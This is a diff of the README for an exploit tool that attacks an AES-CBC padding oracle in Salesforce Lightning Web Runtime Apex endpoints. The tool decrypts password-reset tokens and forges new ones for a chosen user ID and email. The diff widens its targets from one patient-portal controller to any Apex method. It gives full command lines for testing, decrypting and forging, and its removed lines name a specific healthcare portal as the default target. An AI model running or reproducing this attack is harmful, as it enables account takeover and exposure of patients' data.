@@ -1,6 +1,6 @@
 # AES-CBC Padding Oracle Attack
 
-Exploit tool for AES-CBC padding oracle vulnerabilities in Salesforce Lightning Web Runtime (LWR) patient portals. Targets the `MyacConfirmationPageController.checkIfLinkNotExpired` Apex method exposed via `/s/webruntime/api/apex/execute`.
+Exploit tool for AES-CBC padding oracle vulnerabilities in Salesforce Lightning Web Runtime (LWR) Apex endpoints. Targets any Apex controller method that accepts an `encryptedParams` parameter via `/s/webruntime/api/apex/execute`.
 
 Supports three operations:
 - **Test** — Verify the three oracle states (length error, bad padding, valid decryption)
@@ -21,12 +21,24 @@ cd AES-CBC-POA
 
 ## Usage
 
+All modes require three target parameters:
+
+| Parameter | Description |
+|-----------|-------------|
+| `--host` | Target hostname |
+| `--classname` | Apex controller class name |
+| `--method` | Apex method that accepts `encryptedParams` |
+
 ### Test Oracle
 
 Verify the endpoint is vulnerable by confirming three distinct error states:
 
 ```bash
-python3 aes_cbc_poa.py --test
+python3 aes_cbc_poa.py \
+  --host portal.example.com \
+  --classname MyController \
+  --method myMethod \
+  --test
 ```
 
 ```
@@ -42,13 +54,24 @@ State 3 (16B edge case):       1
 Decrypt a base64-encoded AES-CBC token captured from a password reset URL:
 
 ```bash
-python3 aes_cbc_poa.py --decrypt '<base64_token>' --threads 7
+python3 aes_cbc_poa.py \
+  --host portal.example.com \
+  --classname MyController \
+  --method myMethod \
+  --decrypt '<base64_token>' \
+  --threads 7
 ```
 
 Add `--verbose` for per-byte progress output:
 
 ```bash
-python3 aes_cbc_poa.py --decrypt '<base64_token>' --threads 7 --verbose
+python3 aes_cbc_poa.py \
+  --host portal.example.com \
+  --classname MyController \
+  --method myMethod \
+  --decrypt '<base64_token>' \
+  --threads 7 \
+  --verbose
 ```
 
 Decrypts all blocks in parallel. Typical token (128 bytes, 7 blocks) takes ~12 minutes with 7 threads and ~15,000 requests.
@@ -58,30 +81,47 @@ Decrypts all blocks in parallel. Typical token (128 bytes, 7 blocks) takes ~12 m
 Create a new encrypted token containing a target user's Salesforce ID and email:
 
 ```bash
-python3 aes_cbc_poa.py --forge --userid 005XXXXXXXXXYYYYYY --email target@example.com
+python3 aes_cbc_poa.py \
+  --host portal.example.com \
+  --classname MyController \
+  --method myMethod \
+  --forge \
+  --userid 005XXXXXXXXXYYYYYY \
+  --email target@example.com
 ```
 
-Optionally specify a custom timestamp (default: current time, 24h validity):
+Optionally specify a custom timestamp (default: current time, 24h validity) and parallel guess threads:
 
 ```bash
-python3 aes_cbc_poa.py --forge --userid 005XXXXXXXXXYYYYYY --email target@example.com --timestamp 1772244877815
+python3 aes_cbc_poa.py \
+  --host portal.example.com \
+  --classname MyController \
+  --method myMethod \
+  --forge \
+  --userid 005XXXXXXXXXYYYYYY \
+  --email target@example.com \
+  --timestamp 1772244877815 \
+  --forge-threads 32
 ```
 
-Forgery is sequential (blocks built last-to-first) and takes ~10 minutes for a typical token. The forged token is verified against the oracle before output.
+Forgery builds blocks sequentially (last-to-first) but guesses within each byte position in parallel. With 16 forge threads (default), typical forge takes ~5-8 minutes. The forged token is verified against the oracle before output.
 
-### Options
+### All Options
 
-| Flag | Description |
-|------|-------------|
-| `--test` | Test the three oracle states |
-| `--decrypt TOKEN` | Decrypt a base64 token |
-| `--forge` | Forge a new token |
-| `--userid ID` | Target Salesforce User ID (required for forge) |
-| `--email EMAIL` | Target email address (required for forge) |
-| `--timestamp TS` | Epoch milliseconds (default: now) |
-| `--host HOST` | Target hostname (default: `immunology.my.abbviecare.com`) |
-| `--threads N` | Parallel threads for decrypt (default: 7) |
-| `--verbose` | Show per-byte decryption/forgery progress |
+| Flag | Description | Default |
+|------|-------------|---------|
+| `--test` | Test the three oracle states | — |
+| `--decrypt TOKEN` | Decrypt a base64 token | — |
+| `--forge` | Forge a new token | — |
+| `--host HOST` | Target hostname (required) | — |
+| `--classname CLASS` | Apex controller class (required) | — |
+| `--method METHOD` | Apex method name (required) | — |
+| `--userid ID` | Target Salesforce User ID (forge) | — |
+| `--email EMAIL` | Target email address (forge) | — |
+| `--timestamp TS` | Epoch milliseconds (forge) | now |
+| `--threads N` | Parallel threads for decrypt | 7 |
+| `--forge-threads N` | Parallel guess threads for forge | 16 |
+| `--verbose` | Show per-byte progress | off |
 
 ## How It Works
 
@@ -93,25 +133,9 @@ The Salesforce LWR Apex endpoint returns three distinct error types when process
 
 The transition from error #2 to error #3 is the padding oracle: it tells the attacker whether a given ciphertext produced valid PKCS#7 padding after decryption.
 
-**Decrypt** exploits this by manipulating the preceding ciphertext block byte-by-byte. For each byte position, 256 guesses are tested. When the oracle returns "valid padding" instead of "bad padding," the intermediate decryption value is derived mathematically, and XOR with the original preceding block recovers the plaintext byte.
+**Decrypt** exploits this by manipulating the preceding ciphertext block byte-by-byte. For each byte position, up to 256 guesses are tested. When the oracle returns "valid padding" instead of "bad padding," the intermediate decryption value is derived mathematically, and XOR with the original preceding block recovers the plaintext byte.
 
-**Forge** reverses the process: starting from the last block and working backward, the tool discovers intermediate values for each randomly-chosen ciphertext block, then XORs with the desired plaintext to compute the preceding block. The result is a completely new ciphertext that decrypts to attacker-controlled plaintext.
-
-## Token Format
-
-Decrypted tokens contain JSON with the following structure:
-
-```json
-{
-  "userid": "005J9000000bB8FIAU",
-  "un": "user@example.com",
-  "timestamp": "1772238536204"
-}
-```
-
-- `userid` — 18-character Salesforce User ID (prefix `005`)
-- `un` — User's email address
-- `timestamp` — Epoch milliseconds (24-hour validity window)
+**Forge** reverses the process: starting from the last block and working backward, the tool discovers intermediate values for each randomly-chosen ciphertext block via parallel guessing, then XORs with the desired plaintext to compute the preceding block. The result is a completely new ciphertext that decrypts to attacker-controlled plaintext.
 
 ## References
 
